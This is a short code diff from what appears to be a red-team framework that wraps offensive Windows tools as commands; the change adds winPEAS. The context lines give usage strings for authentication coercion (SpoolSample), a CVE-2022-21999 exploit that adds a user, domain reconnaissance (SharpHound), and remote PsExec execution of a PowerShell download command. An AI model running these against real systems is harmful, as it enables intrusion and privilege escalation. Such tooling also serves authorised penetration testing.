@@ -456,6 +456,7 @@ cs_exe('thirdparty_libs/SpoolSample.exe', 'Invoke-SpoolSample <victim> <attacker
 cs_exe('thirdparty_libs/SpoolFool.exe', 'SpoolFool (CVE-2022-21999) on Windows Desktop ( Invoke-SpoolFool -dll AddUser.dll )')
 cs_exe('thirdparty_libs/SharpHound.exe', 'Invoke-Bloodhound -c "All,GPOLocalGroup" --outputdirectory $env:tmp -s -Domain xxx.com', 
         'SharpHound.Program', 'Invoke-Bloodhound')
+cs_exe('thirdparty_libs/winPEAS.exe', 'winPEAS')
 cs_exe('csharp/myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 'myPsExec.Program')
 cs_exe('csharp/SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
 
